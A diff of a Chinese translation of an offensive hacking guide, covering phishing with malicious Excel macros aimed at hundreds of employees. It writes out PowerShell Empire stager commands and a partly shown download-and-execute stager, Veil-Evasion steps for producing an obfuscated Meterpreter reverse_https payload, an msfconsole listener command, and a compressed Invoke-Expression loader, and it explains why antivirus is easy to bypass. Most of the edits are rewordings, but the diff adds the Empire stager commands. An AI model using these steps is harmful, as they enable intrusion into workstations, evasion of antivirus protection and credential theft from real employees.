@@ -234,28 +234,33 @@ End Sub
 
 作者的全面指南可在以下[21\]地址获得，以使其有效。
 
-#### 3、帝国反击战
+#### 3、The Empire strikes
 
-之前的有效载荷很好，但在现场情况下它有一些主要的限制:
+先前的payload很好，但它涉及到一些情况就会有以下局限性:
 
 * 因为我们使用原始套接字来启动连接，所以使用Web代理访问互联网的工作站（很可能）将无法连接回来。
-* 我们的Netcat监听器每次只接受一个连接。不适合针对数百名用户的网络钓鱼行动。
-* 我们使用的shell是相当基本的。有一些自动命令可能会更有趣，例如启动键盘记录器，嗅探密码等。
+* 我们的Netcat监听器每次只接受一个连接，这不适合针对数百名用户的网络钓鱼行动。
+* 我们使用的shell是相当基本的，若有一些自动命令可能会更有趣，比如启动键盘记录程序，嗅探密码等。
 
 这就是臭名昭着的PowerShell Empire 派上用场的地方。它是一个框架，提供一个能够处理多个受感染用户的监听器，但也为shell提供了一些有趣的命令，如获取明文密码，数据透视，权限提升等。
 
-按照此博客文章\[[http://www.powershellempire.com/?page\_id=110\]下载并安装Empire](http://www.powershellempire.com/?page_id=110]下载并安装Empire) PS（ 基本上复制Git存储库并启动 install. sh ）。
+按照此博客文章[http://www.powershellempire.com/?page\_id=110\] 下载并安装Empire PS（ 基本上复制Git存储库并启动 install. sh )
 
-在欢迎屏幕上，转到监听器菜单（命令监听器）并列出默认位置info命令:
+在欢迎屏幕上，转到监听器菜单（命令监听器）并使用info命令列出默认位置:
 
 ![](.gitbook/assets/9.info.png)
 
 
- 通过发出set命令设置正确的端口和地址（例如，设置端口443）。然后通过发出run 来执行监听器。
+ 通过发出set命令（例如**设置端口443**）设置正确的端口和地址，然后通过输入**<Listener_name>**来执行监听器。
 
 现在我们需要生成回连此监听器的PowerShell代码。我们将这段代码称为“stager”或“agent”:
 
 ```text
+(Emire) > Usestager launcher 
+(Emire) > Set Listener test 
+(Emire) > Set Base64 False
+(Emire) > Set OutFile /root/stager.ps1
+
 [SysTeM.NET.SErVicePOinTMaNAGer]::EXPeCt10 = 0;
 $wC=NEw-ObjEct SYstEM.Net.WEbCLIenT;
 $u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';
@@ -270,21 +275,21 @@ IEX ($B-joIn'')
 
 ![](.gitbook/assets/10.stager.png)
 
-我们将在接下来的章节中探讨Empire的一些有趣功能，但与此同时，您可以查看帮助命令以获得一个想法。
+我们将在接下来的章节中探讨Empire的一些有趣功能，同时您也可以通过help命令来了解 。
 
-为了将此PowerShell脚本嵌入到Excel文档中，我们将使用普通的shell函数，如前所示，或依赖于LuckyStrike。
+为了将此PowerShell脚本嵌入到Excel文档中，我们将使用常规的shell函数（如前所示）或依赖于LuckyStrike。
 
-#### 4\)Meterpreter  in VBA
+#### 4、Meterpreter  in VBA
 
-为了替代使用PowerShell Empire的stager来获取shell，我们可以采取另一种方式，例如，通过部署一个来自Metasploit框架的meterpreter shell。就我们的直接目的而言，两个平台之间的差异相对较小。他们都有额外的模块来对受感染的工作站执行有趣的操作，但是使用两个分级器会增加绕过SPH的反恶意软件解决方案（防病毒，沙箱，IDS等）的几率。
+为了替代使用PowerShell Empire的stager来获取shell，我们可以采取另一种方式，例如，通过部署一个来自Metasploit框架的meterpreter shell。就我们的直接目的而言，两个平台之间的差异相对较小。他们都有额外的模块来对受感染的工作站执行有趣的操作，但是使用两个stager会增加绕过SPH的反恶意软件解决方案（防病毒，沙箱，IDS等）的几率。
 
-如前所述，虽然metasploit的有效载荷（包括meterpreter）是反病毒公司所熟知的。他们一旦被目标接收就永远不会发出警报。为了克服这个障碍，我们将使用另一个自动添加多层加密和混淆的工具生成相同的meterpreter有效负载：Veil-Evasion（项目地址:[https://github.com/Veil-Framework/Veil-Evasion](https://github.com/Veil-Framework/Veil-Evasion) ，Veil-Evasion是与Metasploit生成相兼容的Payload的一款辅助框架,并可以绕过大多数的杀软）。
+但是，如前所述，metasploit的有效载荷（包括meterpreter）是反病毒公司所熟知的，一旦被防病毒发现，就会发出告警。为了绕过这个告警，我们将使用另一种自动添加多层加密和混淆的工具生成相同的meterpreter payload：Veil-Evasion（项目地址:[https://github.com/Veil-Framework/Veil-Evasion](https://github.com/Veil-Framework/Veil-Evasion) ，Veil-Evasion是与Metasploit生成相兼容的Payload的一款辅助框架,并可以绕过大多数的杀软）。
 
-回顾一下，Veil-Evasion将在PowerShell中生成一个模糊的meterpreter shellcode，这段代码将连接回连Front Gun服务器上的常规metasploit监听器，并让我们完全访问工作站。
+回顾一下，Veil-Evasion将在PowerShell中生成一个混淆的meterpreter shellcode，且这段代码将连接回连Front Gun服务器上的常规metasploit监听器，使得我们可以完全访问工作站。
 
-非常漂亮。但是我们该怎么做呢？首先，我们需要在Linux上使用经典的apt-get install安装Veil-Evasion。安装时间有点长，但我们可以一次完成，非常简单直观： ![](.gitbook/assets/11.veil-evasion.png)
+干的漂亮。但是我们该怎么做呢？首先，我们需要在Linux上使用经典的apt-get install安装Veil-Evasion。安装时间有点长，但我们可以一次完成，非常简单直观： ![](.gitbook/assets/11.veil-evasion.png)
 
-list命令显示所有可用的有效负载。我们选择PowerShell reverse\_https有效负载：
+**list**命令显示所有可用的有效负载。我们选择PowerShell reverse\_https有效负载：
 
 ```text
 >use powershell/meterpreter/rev_https
@@ -299,7 +304,7 @@ list命令显示所有可用的有效负载。我们选择PowerShell reverse\_ht
 * 执行PowerShell 有效载荷的meter.bat文件
 * 一个预先配置的metasploit监听器：meter.rc
 
-我们需要使用以下命令启动监听器:
+我们使用下列命令来启动监听器:
 
 ```text
 FrontGun$ msfconsole -r meter.rc
@@ -307,7 +312,7 @@ FrontGun$ msfconsole -r meter.rc
 
 然后我们可以测试meter.bat文件以确保它正常运行： ![](.gitbook/assets/12.test-meter-bat.png)
 
-好的，现在要将此有效负载包含在Excel文件中，我们需要人工地深入了解代码。如果打开生成的meter.bat文件，您将看到其唯一目的是找出目标的体系结构并启动相应的PowerShell版本（x86或x64）： ![](.gitbook/assets/13.code-meter-bat.png)
+好的，现在我们需要人工地深入了解代码，将这个payload插入到Excel文件中。如果打开生成的meter.bat文件，您将看到其唯一目的就是找出目标的体系结构并执行对应版本的PowerShell（x86或x64）： ![](.gitbook/assets/13.code-meter-bat.png)
 
 您可能已经注意到，meter.bat文件还以内联方式调用PS脚本，尽管这种掩饰并没有对命令进行编码。我们可以在VBA中转换该体系结构验证例程，然后从meter.bat文件中借用命令，我们可以开始了。
 
@@ -319,15 +324,17 @@ Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.Defl
 
 我们执行这个meter.ps1文件来检查它是否仍然可以正常工作。现在我们有了正常的PowerShell文件，我们可以使用Lucky Strike生成适当的恶意Excel文件。
 
-### 2.1.4 摘要
+### 2.1.4 总结
 
 综上所述，我们使用Gophish建立了一个电子邮件发送平台，收集了一些目标员工，并准备了两种功能强大的Excel恶意软件变种，它们很可能能绕过大多数防病毒保护。
 
-关于这种攻击媒介的妙处在于，如果攻击成功（实际上，我们看起来只需要数百名员工中的一个受害者），我们就能进入Greenbox！ ![](.gitbook/assets/14.network.png)
+关于这种攻击媒介的妙处在于，如果攻击成功（实际上，我们看起来只需要数百名员工中的一个受害者），我们就能潜入内网。
 
-为什么防病毒解决方案不是一个问题呢?
+ ![](.gitbook/assets/14.network.png)
 
-防病毒解决方案主要基于签名来工作：即，文件中被标记为恶意的特定数据包。例如，防病毒软件会标记恶意软件Trojan.Var.A !！通过检查代码中的以下字节序列：0xFC99AADBA6143A。有些编辑器可能具有代码分析，反转，随机性检查等高级功能。但是，实际上，核心引擎主要基于签名。
+为什么防病毒软件不是一个问题呢?
+
+防病毒软件主要基于签名来工作，即文件中被标记为恶意的特定数据包。如，防病毒软件会通过检查代码中的以下字节序列：0xFC99AADBA6143A标记恶意软件Trojan.Var.A !！。虽然有些编辑器可能具有代码分析，反转，随机性检查等高级功能，但是，实际上，核心引擎主要基于签名。
 
 除了从头开始编码恶意软件的明显替代方案之外，还可以避免与任何已知的恶意软件匹配的特征，这是有关防病毒解决方案的一个重要事实，使它们易于完全绕过。
 
